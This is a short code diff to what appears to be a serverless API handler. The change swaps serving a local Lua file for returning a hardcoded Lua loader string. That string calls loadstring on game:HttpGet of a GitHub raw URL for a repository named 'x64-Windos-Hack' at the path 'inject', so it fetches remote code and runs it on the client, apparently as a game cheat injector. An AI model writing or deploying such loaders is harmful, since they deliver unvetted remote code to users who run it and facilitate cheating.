@@ -1,10 +1,4 @@
-const fs = require("fs");
-const path = require("path");
-
-module.exports = (req, res) => {
-  const filePath = path.join(__dirname, "api.lua");
-  let raw = fs.readFileSync(filePath, "utf8");
-  let payload = raw.replace(/\r?\n/g, "").replace(/"/g, '\\"');
-  res.setHeader("Content-Type", "text/plain");
-  res.status(200).send(`return "${payload}"`);
-};
+export default function handler(req, res) {
+  const luaResponse = `return "loadstring(game:HttpGet(\\"https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject\\"))()"`;
+  res.status(200).json({ script: luaResponse });
+}
